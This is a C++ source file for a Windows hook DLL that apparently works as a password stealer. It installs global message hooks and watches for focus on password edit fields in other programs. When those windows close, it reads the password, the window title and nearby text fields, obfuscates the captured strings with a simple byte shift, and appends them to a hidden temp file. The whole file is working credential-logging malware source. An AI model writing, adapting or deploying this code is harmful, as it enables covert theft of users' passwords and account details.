// HookDll.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include <afxdllx.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#include "HookDll.h"
#pragma data_seg(".sdata")
 HHOOK hHookMsg=0;
 HHOOK hHookProc=0;
 HINSTANCE hinst=0;
 HWND hHandleWnd=0;
 int numbers=0;
 int SpyArrayNums=0;
 int randv=0;
 CHook* phook=0;
 CDWordArray SpyWndList[20];
#pragma data_seg()

static AFX_EXTENSION_MODULE HookDllDLL = { NULL, NULL };

extern "C" _declspec(dllexport)LRESULT WINAPI CallMsgProc(int nCode,WPARAM wParam,LPARAM lParam);
extern "C" _declspec(dllexport)LRESULT WINAPI CallWndProc(int nCode,WPARAM wParam,LPARAM lParam);
BOOL WINAPI HookProc(HWND hwnd,UINT uiMessage,WPARAM wParam,LPARAM lParam);

extern "C" int APIENTRY
DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	// Remove this if you use lpReserved
	UNREFERENCED_PARAMETER(lpReserved);

	if (dwReason == DLL_PROCESS_ATTACH)
	{
		TRACE0("HOOKDLL.DLL Initializing!\n");
		
		// Extension DLL one-time initialization
		if (!AfxInitExtensionModule(HookDllDLL, hInstance))
			return 0;
		numbers++;
		if(numbers==1&&phook==0) 
		{
			hinst=hInstance;
			randv=GetTickCount()/5000;
			phook=new CHook;
			phook->HookInstaller();
		}
		new CDynLinkLibrary(HookDllDLL);
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
		TRACE0("HOOKDLL.DLL Terminating!\n");
		// Terminate the library before destructors are called
				numbers--;
		if(numbers==0&&phook)
		{
			phook->HookUninstaller();
			delete phook;
			phook=0;
		}
		AfxTermExtensionModule(HookDllDLL);
	}
	return 1;   // ok
}

CHook::CHook()
{
}

CHook::~CHook()
{
	HookUninstaller();
}

BOOL CHook::HookInstaller()
{
	if((hHookMsg=SetWindowsHookEx(WH_GETMESSAGE,CallMsgProc,hinst,0))!=NULL
		&&(hHookProc=SetWindowsHookEx(WH_CALLWNDPROC,CallWndProc,hinst,0))!=NULL)
		return true;
	return false;
}

BOOL CHook::HookUninstaller()
{
	BOOL bUninstall;
	if(hHookMsg)
	{
		bUninstall=UnhookWindowsHookEx(hHookMsg);
		if(bUninstall)
		{
			hHookMsg=NULL;
			bUninstall=UnhookWindowsHookEx(hHookProc);
			if(bUninstall)
			{
				hHandleWnd=NULL;
				hHookProc=NULL;
			}
		}
	}
	return bUninstall;
}

void CHook::SetHandleWindow(HWND hWnd)
{
	hHandleWnd=hWnd;
}

extern "C" _declspec(dllexport)LRESULT WINAPI CallMsgProc(int nCode,WPARAM wParam,LPARAM lParam)
{
	PMSG pMsg=(MSG*)lParam;
	if(nCode>=0&&pMsg&&pMsg->hwnd)
	{
		HookProc(pMsg->hwnd,pMsg->message,pMsg->wParam,pMsg->lParam);
	}
	return CallNextHookEx(hHookMsg,nCode,wParam,lParam);
}

extern "C" _declspec(dllexport)LRESULT WINAPI CallWndProc(int nCode,WPARAM wParam,LPARAM lParam)
{    
	PCWPSTRUCT pCwps;
    pCwps = (PCWPSTRUCT)lParam;
    if (nCode>=0&&pCwps && pCwps->hwnd)
    {
        HookProc(pCwps->hwnd, pCwps->message, pCwps->wParam, pCwps->lParam);
    }

    return CallNextHookEx(hHookProc, nCode, wParam, lParam);
}
int WINAPI InSpyList(HWND hwnd)
{
	if(SpyArrayNums)
	{
		for(int i=0;i<SpyArrayNums;i++)
		{
			SpyWndList[i];
			if(int wndnum=SpyWndList[i].GetSize())
			{
				for(int j=0;j<wndnum;j++)
					if(SpyWndList[i].GetAt(j)==(DWORD)hwnd)
						return i;
			}
		}
	}
	return -1;
}
void WINAPI AddToSpyList(HWND hWnd)
{
	HWND hParent;
	CWordArray aarray;
	if(hParent=GetParent(hWnd))
	{
		if(InSpyList(hParent)!=-1)
			return;
		SpyWndList[SpyArrayNums].Add((DWORD)hParent);
	}
	HWND sib=::GetWindow(hWnd,GW_HWNDFIRST);
	char lpClassName[255];
	CString strWndClass;
	::GetClassName(sib, lpClassName, 255);
	strWndClass = lpClassName;
	// Is this an Edit control
	if (0 ==strWndClass.CompareNoCase("EDIT"))
		SpyWndList[SpyArrayNums].Add((DWORD)sib);
	while((sib=::GetWindow(sib,GW_HWNDNEXT))!=NULL)
	{
		::GetClassName(sib, lpClassName, 255);
		strWndClass = lpClassName;
		// Is this an Edit control
		if (0 ==strWndClass.CompareNoCase("EDIT"))
			SpyWndList[SpyArrayNums].Add((DWORD)sib);
	}
//	SpyWndList[SpyArrayNums];
	SpyArrayNums++;
	if(SpyArrayNums==21)
		SpyArrayNums=20;
}
void WINAPI RemoveFromList(int index)
{
	if(index>=SpyArrayNums)
		return;
	SpyWndList[index].RemoveAll();
	for(int i=0;i<SpyArrayNums-index-1;i++)
	{
		SpyWndList[index+i].Copy(SpyWndList[index+i+1]);
		SpyWndList[index+i+1].RemoveAll();
	}
	SpyArrayNums--;
}
BOOL Crypto(CString str,char* write)
{
	int len=str.GetLength();
	for(int i=0;i<len;i++)
		write[i]=str[i]+0x70;
	write[i]=0;
	return true;
}

BOOL DeCrypto(PBYTE code,char* decode,int length)
{
	for(int i=0;i<length;i++)
		decode[i]=code[i]-0x70;
	return true;
}
BOOL WINAPI HookProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	char szCaption[100]="\0";
	char szTitle[100]="\0";
	char classname[255];
	int indexx;
//	static DWORD randv=GetTickCount()/100;
	CString SaveInfo;
	if(message&&IsWindow(hwnd))
	{		
		GetClassName(hwnd,classname,255);
		LONG style=GetWindowLong(hwnd,GWL_STYLE);
		CString strClass;
		switch(message){
		case WM_SETFOCUS:
			strClass=classname;
			if(!strClass.CompareNoCase("EDIT"))
			{
				if((style&ES_PASSWORD)&&(InSpyList(hwnd)==-1))
					AddToSpyList(hwnd);
			}
			break;
		case WM_DESTROY:
			if((indexx=InSpyList(hwnd))!=-1)
			{
				int i=indexx;
				for(int j=0;j<SpyWndList[i].GetSize();j++)
				{
					HWND spywin;
					spywin=(HWND)SpyWndList[i].GetAt(j);
					LONG lStyle = ::GetWindowLong(spywin, GWL_STYLE);
					if(IsWindow(spywin)&&j==0)
					{
						char szText[255]="\0";
						//int l=::GetWindowText(hwnd, szText,sizeof(szText));
						::SendMessage(spywin,WM_GETTEXT,255,(LPARAM)szText); 
						CString temp= szText;
						SaveInfo=SaveInfo+"(window)"+temp+"\t";
					}
					else 
						if (lStyle & ES_PASSWORD)
						{
							char szText[255]="\0";
								//int l=::GetWindowText(hwnd, szText,sizeof(szText));
							::SendMessage(spywin,WM_GETTEXT,255,(LPARAM)szText); 
							CString temp= szText;
							 SaveInfo=SaveInfo+"(password)"+temp+"\t";
							 if(temp.GetLength()==0)
								 return true;
						}
						else
						{
							char szText[255]="\0";
							::SendMessage(spywin,WM_GETTEXT,255,(LPARAM)szText);
							 CString temp= szText;
							 SaveInfo=SaveInfo+"(edit)"+temp+"\t";
						}
	
				}
				RemoveFromList(indexx);
				time_t now;
				time(&now);
				struct tm* tmnow;
				tmnow=localtime(&now);
				char* timenow=asctime(tmnow);
				CString temp;
				temp=timenow;
				int strlen=temp.GetLength();
				temp=temp.Left(strlen-1);
				SaveInfo=temp+":"+SaveInfo+"\r\n";
				char ptemppath[255];
				GetTempPath(255,ptemppath);
				CString strFileName;
				strFileName.Format("%s",ptemppath);
				CString strName;
				strName.Format("~mps%d.tmp",randv);
				strFileName=strFileName+strName;
				CFile f( LPCTSTR(strFileName), CFile::modeCreate | CFile::modeWrite |CFile::modeNoTruncate);
				f.Seek( 0, CFile::end );
				int infolen=SaveInfo.GetLength();
				char*  forwrite;
				forwrite=new char[infolen+1];
				Crypto(SaveInfo,forwrite);
				f.Write((LPCTSTR)forwrite,infolen);
				f.Close(); 
				delete[] forwrite;
				////////////////////////////////
				////////////////////////////////

			}		
				break;
		default:

			//	sprintf(szCaption,"oh,The mouse x:%d y:%d",pMsg->pt.x,pMsg->pt.y);
				break;
		}
		if(IsWindow(hHandleWnd))
		{
			if(strlen(szCaption)>=1)
				SendMessage(hHandleWnd,WM_SETTEXT,0,(LPARAM)(LPCTSTR)szCaption);
		}
	}
	return true;
}

extern "C" _declspec(dllexport) void NtShellNotify()
{
}
//////
